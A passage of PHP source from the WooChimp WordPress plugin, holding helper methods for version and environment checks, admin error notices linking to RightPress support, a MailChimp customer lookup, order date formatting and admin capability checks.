     * Check WordPress version
     *
     * @access public
     * @param string $version
     * @return bool
     */
    public static function wp_version_gte($version)
    {
        $wp_version = get_bloginfo('version');

        if ($wp_version) {
            return version_compare($wp_version, $version, '>=');
        }

        return false;
    }

    /**
     * Check if environment meets requirements
     *
     * @access public
     * @return bool
     */
    public static function check_environment()
    {
        $is_ok = true;

        // Check PHP version (RightPress Helper requires PHP 5.3 for itself)
        if (!version_compare(PHP_VERSION, WOOCHIMP_SUPPORT_PHP, '>=')) {
            add_action('admin_notices', array('WooChimp', 'php_version_notice'));
            $is_ok = false;
        }

        // Check WordPress version
        if (!self::wp_version_gte(WOOCHIMP_SUPPORT_WP)) {
            add_action('admin_notices', array('WooChimp', 'wp_version_notice'));
            $is_ok = false;
        }

        // Check if WooCommerce is enabled
        if (!class_exists('WooCommerce')) {
            add_action('admin_notices', array('WooChimp', 'wc_disabled_notice'));
            $is_ok = false;
        }
        else if (!self::wc_version_gte(WOOCHIMP_SUPPORT_WC)) {
            add_action('admin_notices', array('WooChimp', 'wc_version_notice'));
            $is_ok = false;
        }

        // Get options directly, as the class isn't loaded yet
        $options = get_option('woochimp_options');

        // Check if E-Commerce is enabled and list for Store is selected
        if ($options['woochimp_send_order_data'] === '1' && empty($options['woochimp_list_store'])) {
            add_action('admin_notices', array('WooChimp', 'store_not_configured_notice'));
        }

        return $is_ok;
    }

    /**
     * Display 'Store not configured' notice
     *
     * @access public
     * @return void
     */
    public static function store_not_configured_notice()
    {
        echo '<div class="error"><p>' . sprintf(__('<strong>Warning!</strong> MailChimp E-Commerce functionality requires a Store to be configured. You can do this %s.', 'woochimp'), '<a href="' . admin_url('admin.php?page=woochimp&tab=ecomm') . '">' . __('here', 'woochimp') . '</a>') . '</p></div>';
    }

    /**
    * Display PHP version notice
    *
    * @access public
    * @return void
    */
   public static function php_version_notice()
   {
       echo '<div class="error"><p>' . sprintf(__('<strong>WooChimp</strong> requires PHP %s or later. Please update PHP on your server to use this plugin.', 'woochimp'), WOOCHIMP_SUPPORT_PHP) . ' ' . sprintf(__('If you have any questions, please contact %s.', 'woochimp'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'woochimp') . '</a>') . '</p></div>';
   }

    /**
     * Display WP version notice
     *
     * @access public
     * @return void
     */
    public static function wp_version_notice()
    {
        echo '<div class="error"><p>' . sprintf(__('<strong>WooChimp</strong> requires WordPress version %s or later. Please update WordPress to use this plugin.', 'woochimp'), WOOCHIMP_SUPPORT_WP) . ' ' . sprintf(__('If you have any questions, please contact %s.', 'woochimp'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'woochimp') . '</a>') . '</p></div>';
    }

    /**
     * Display WC disabled notice
     *
     * @access public
     * @return void
     */
    public static function wc_disabled_notice()
    {
        echo '<div class="error"><p>' . sprintf(__('<strong>WooChimp</strong> requires WooCommerce to be activated. You can download WooCommerce %s.', 'woochimp'), '<a href="http://url.rightpress.net/woocommerce-download-page">' . __('here', 'woochimp') . '</a>') . ' ' . sprintf(__('If you have any questions, please contact %s.', 'woochimp'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'woochimp') . '</a>') . '</p></div>';
    }

    /**
     * Display WC version notice
     *
     * @access public
     * @return void
     */
    public static function wc_version_notice()
    {
        echo '<div class="error"><p>' . sprintf(__('<strong>WooChimp</strong> requires WooCommerce version %s or later. Please update WooCommerce to use this plugin.', 'woochimp'), WOOCHIMP_SUPPORT_WC) . ' ' . sprintf(__('If you have any questions, please contact %s.', 'woochimp'), '<a href="http://url.rightpress.net/new-support-ticket">' . __('RightPress Support', 'woochimp') . '</a>') . '</p></div>';
    }

    /**
     * E-Commerce - check if customer exists in Mailchimp
     *
     * @access public
     * @param int $store_id
     * @param string $customer_id
     * @return void
     */
    public function customer_exists($store_id, $customer_id)
    {
        try {
            $this->mailchimp->get_customer($store_id, $customer_id);
            return true;
        }
        catch (Exception $e) {
            return false;
        }
    }

    /**
     * Get order date string
     *
     * @access public
     * @param object $order
     * @return string
     */
    public static function get_order_date_string($order)
    {
        return gmdate('Y-m-d H:i:s', $order->get_date_created()->getOffsetTimestamp());
    }

    /**
     * Get order modified date string
     *
     * @access public
     * @param object $order
     * @return string
     */
    public static function get_order_modified_date_string($order)
    {
        return gmdate('Y-m-d H:i:s', $order->get_date_modified()->getOffsetTimestamp());
    }

    /**
     * Check if current user has admin capability
     *
     * @access public
     * @return bool
     */
    public static function is_admin()
    {
        return current_user_can(WooChimp::get_admin_capability());
    }

    /**
     * Get admin capability
     *
     * @access public
     * @return string
     */
    public static function get_admin_capability()
    {
        return apply_filters('woochimp_capability', 'manage_woocommerce');
    }

    /**
     * Custom capability for options
     *
     * @access public
     * @param string $capability
     * @return string
     */
    public function custom_options_capability($capability)
    {
        return WooChimp::get_admin_capability();
    }






}

WooChimp::get_instance();

}
